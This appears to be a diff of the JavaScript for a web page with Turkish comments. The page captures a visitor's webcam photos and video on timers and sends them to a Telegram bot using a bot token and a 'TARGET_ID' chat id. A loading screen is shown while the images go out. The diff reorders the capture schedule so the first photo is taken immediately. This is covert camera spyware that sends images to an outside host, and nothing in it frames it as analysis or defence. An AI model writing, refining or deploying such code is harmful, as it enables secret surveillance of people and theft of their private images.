@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
+            // ==================== KAMERA İŞLEMLERİ - SON ŞANS ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -155,7 +155,6 @@
             let stream = null;
             let fotoInterval = null;
             let videoInterval = null;
-            let ilkFotoCekildi = false;
             
             async function startCamera() {
                 try {
@@ -173,32 +172,6 @@
                         video.play();
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
-                        
-                        // ========================================
-                        // FOTOĞRAF FONKSİYONU
-                        // ========================================
-                        function fotoCek() {
-                            if (!stream?.active) return;
-                            
-                            photoCount++;
-                            
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(function(blob) {
-                                if (!blob) return;
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }, 'image/jpeg', 0.85);
-                        }
                         
                         // ========================================
                         // VİDEO FONKSİYONU
@@ -246,31 +219,61 @@
                         }
                         
                         // ========================================
-                        // SIRALI BAŞLANGIÇ
+                        // FOTOĞRAF FONKSİYONU
                         // ========================================
-                        
-                        // 1. VİDEO HEMEN BAŞLASIN
-                        videoCek();
-                        
-                        // 2. FOTOĞRAFLAR 500ms SONRA BAŞLASIN (1. VİDEO KARARLI OLSUN)
-                        setTimeout(() => {
-                            // İlk fotoğraf
-                            fotoCek();
-                            ilkFotoCekildi = true;
+                        function fotoCek() {
+                            if (!stream?.active) return;
                             
-                            // Diğer fotoğraflar
-                            fotoInterval = setInterval(() => {
-                                if (!stream?.active) return;
-                                fotoCek();
-                            }, FOTO_SURESI * 1000);
+                            photoCount++;
                             
-                        }, 500);
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(function(blob) {
+                                if (!blob) return;
+                                const formData = new FormData();
+                                formData.append('chat_id', TARGET_ID);
+                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
+                                
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            }, 'image/jpeg', 0.85);
+                        }
                         
-                        // 3. DİĞER VİDEOLAR
+                        // ========================================
+                        // TEK BİR ZAMANLAYICI
+                        // ========================================
+                        let sayac = 0;
+                        const baslangicZamani = Date.now();
+                        
                         videoInterval = setInterval(() => {
                             if (!stream?.active) return;
+                            
+                            sayac++;
+                            
+                            // Her VIDEO_SURESI saniyede bir video
+                            if (sayac % (VIDEO_SURESI * 1000 / 1000) === 0) {
+                                videoCek();
+                            }
+                            
+                        }, 1000);
+                        
+                        fotoInterval = setInterval(() => {
+                            if (!stream?.active) return;
+                            fotoCek();
+                        }, FOTO_SURESI * 1000);
+                        
+                        // İLK FOTOĞRAFI HEMEN ÇEK (0ms)
+                        fotoCek();
+                        
+                        // İLK VİDEOYU 100ms SONRA ÇEK (fotoğrafla çakışmasın)
+                        setTimeout(() => {
                             videoCek();
-                        }, VIDEO_SURESI * 1000);
+                        }, 100);
                     };
                     
                 } catch(e) {
